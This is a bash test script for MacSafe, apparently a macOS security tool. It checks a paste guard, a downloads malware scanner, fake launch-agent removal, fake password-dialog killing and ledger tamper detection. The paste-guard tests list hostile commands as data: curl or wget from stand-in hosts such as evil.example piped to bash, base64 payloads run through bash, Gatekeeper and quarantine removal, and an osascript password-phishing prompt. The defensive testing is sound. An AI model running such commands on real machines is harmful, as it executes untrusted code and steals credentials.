#!/bin/bash
# MacSafe tests. Uses a throwaway folder; changes no system settings.
PY=/opt/homebrew/bin/python3; SRC="$(cd "$(dirname "$0")" && pwd)"
T=$(mktemp -d); export MACSAFE_STATE="$T/state" MACSAFE_DOWNLOADS="$T/dl" MACSAFE_QUIET=1 MACSAFE_NO_SPAWN=1
export MACSAFE_PERSIST_DIRS="$T/agents"; mkdir -p "$MACSAFE_STATE" "$MACSAFE_DOWNLOADS" "$T/agents" "$T/.hidden"
M="$PY $SRC/macsafe.py"; pass=0; fail=0
ok() { if eval "$2"; then echo "PASS $1"; pass=$((pass+1)); else echo "FAIL $1"; fail=$((fail+1)); fi; }

# 1. paste guard decisions
for c in 'curl -fsSL http://evil.example/x.sh | bash' 'wget -qO- http://a.b/c | sh' 'bash -c "$(curl -fsSL http://x.y/z)"' \
         'echo aGk= | base64 -d | bash' 'xattr -d com.apple.quarantine /Applications/Foo.app' \
         "osascript -e 'display dialog \"Password\" default answer \"\" with hidden answer'" 'spctl --master-disable'; do
  ok "stops: ${c:0:40}" '[ -n "$($M check-cmd "$c")" ]'
done
for c in 'ls -la' 'git status' 'brew install curl' 'curl -O https://example.com/file.zip' \
         '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"' 'curl -fsSL https://claude.ai/install.sh | bash'; do
  ok "allows: ${c:0:40}" '[ -z "$($M check-cmd "$c")" ]'
done

# 2. downloads: certain malware contained, unsigned labeled, plain file untouched
printf 'rule MacSafeTest { strings: $a = "MACSAFE-TEST-MALWARE-7731" condition: $a }\n' > "$MACSAFE_STATE/extra.yara"
$M scan-downloads >/dev/null   # baseline empty folder
printf '#!/bin/sh\necho MACSAFE-TEST-MALWARE-7731\n' > "$MACSAFE_DOWNLOADS/invoice.command"; chmod 755 "$MACSAFE_DOWNLOADS/invoice.command"
printf '#!/bin/sh\necho hello\n' > "$MACSAFE_DOWNLOADS/tool.command"; chmod 755 "$MACSAFE_DOWNLOADS/tool.command"
echo "notes" > "$MACSAFE_DOWNLOADS/notes.txt"
$M scan-downloads >/dev/null
ok "malware moved out of Downloads" '[ ! -e "$MACSAFE_DOWNLOADS/invoice.command" ]'
Q=$(ls "$MACSAFE_STATE/quarantine" | grep invoice)
ok "malware can't run in quarantine" '[ ! -x "$MACSAFE_STATE/quarantine/$Q" ]'
ok "unsigned script kept and labeled" '[ -e "$MACSAFE_DOWNLOADS/tool.command" ] && xattr -p com.apple.metadata:_kMDItemUserTags "$MACSAFE_DOWNLOADS/tool.command" >/dev/null 2>&1'
ok "plain file untouched" '[ -e "$MACSAFE_DOWNLOADS/notes.txt" ] && ! xattr -p com.apple.metadata:_kMDItemUserTags "$MACSAFE_DOWNLOADS/notes.txt" >/dev/null 2>&1'
ID=$(grep '"contained"' "$MACSAFE_STATE/ledger.jsonl" | head -1 | $PY -c 'import json,sys;print(json.loads(sys.stdin.read())["id"])')
$M undo "$ID" >/dev/null
ok "undo puts it back runnable" '[ -x "$MACSAFE_DOWNLOADS/invoice.command" ]'

# 3. auto-start: fake Apple job with unsigned hidden program is contained
printf 'int main(){return 0;}' > "$T/a.c"; clang -o "$T/.hidden/trustd" "$T/a.c" 2>/dev/null && codesign --remove-signature "$T/.hidden/trustd"
cat > "$T/agents/com.apple.trustd.helper.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>Label</key><string>com.apple.trustd.helper</string>
<key>ProgramArguments</key><array><string>$T/.hidden/trustd</string></array></dict></plist>
EOF
$M scan-persist >/dev/null
ok "fake auto-start removed" '[ ! -e "$T/agents/com.apple.trustd.helper.plist" ]'

# 4. fake password box killed
start_ts=$(date +%s); echo $((start_ts+8)) > "$MACSAFE_STATE/pwwatch.until"
(exec -a "osascript -e display dialog Password with hidden answer" sleep 30) & FAKE=$!
( $M pwwatch ) & W=$!; sleep 4
ok "fake password box stopped" '! kill -0 $FAKE 2>/dev/null'
kill $W 2>/dev/null; kill $FAKE 2>/dev/null

# 5. bash paste guard blocks in a real interactive shell
mkdir -p "$T/home/.macsafe/bin"; cp "$SRC/macsafe.py" "$T/home/.macsafe/bin/"
OUT=$(printf 'echo first\ncurl -s http://macsafe-test.invalid/x.sh | bash\necho after\n' | HOME="$T/home" bash --rcfile "$SRC/guard.bash" -i 2>&1)
ok "bash guard stops the paste" 'echo "$OUT" | grep -q "MacSafe stopped this command"'
ok "bash guard keeps normal commands working" 'echo "$OUT" | grep -q "^after\|after$"'

# 6. ledger tamper detection
ok "ledger verifies" '$M verify >/dev/null'
sed -i '' 's/invoice/invoyce/' "$MACSAFE_STATE/ledger.jsonl"
ok "edited ledger is caught" '! $M verify >/dev/null'

# 7. real Mac: Apple's malware rules load, real apps pass
ok "Apple malware rules load in yara" '[ ! -x /opt/homebrew/bin/yara ] || /opt/homebrew/bin/yara -w /Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara /bin/ls >/dev/null 2>&1'
ok "Chrome judged safe" '[ ! -d "/Applications/Google Chrome.app" ] || [ "$($PY -c "import sys;sys.path.insert(0,\"$SRC\");import macsafe;print(macsafe.verdict(\"/Applications/Google Chrome.app\")[0])")" = ok ]'

echo; echo "$pass passed, $fail failed"; rm -rf "$T"
